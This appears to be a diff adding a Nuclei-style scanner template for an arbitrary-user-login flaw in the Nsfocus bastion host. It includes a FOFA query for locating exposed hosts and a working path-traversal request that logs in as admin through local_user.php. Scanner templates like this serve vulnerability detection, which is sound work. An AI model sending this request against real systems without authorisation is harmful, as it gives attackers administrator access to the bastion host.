@@ -1,0 +1,52 @@
+id: nsfocus-auth-bypass
+
+info:
+  name: Nsfocus - Arbitrary User Login
+  author: ritikchaddha
+  severity: high
+  description: |
+    Nsfocus bastion host has an arbitrary user login vulnerability. Attackers can use the vulnerability to log in any user by including www/local_user.php
+  reference:
+    - https://forum.butian.net/article/251
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: body="/needUsbkey.php?username=" && "NSFOCUS"
+  tags: nsfocus,auth-bypass
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    redirects: true
+    max-redirects: 2
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(tolower(body), 'nsfocus')"
+          - "contains(header, 'NSFOCUS')"
+        condition: or
+        internal: true
+
+  - raw:
+      - |
+        GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'status": 200'
+
+      - type: word
+        part: content_type
+        words:
+          - application/json
+# digest: 4a0a00473045022100ca58f061ce0d0e1e04a918b22c9260b815e62271f985ef4635762d4d5040404b02200adea755353be091e0babb051bb7af7779ae88e23c58a291d881f19b14b769c9:922c64590222798bb761d5b6d8e72950
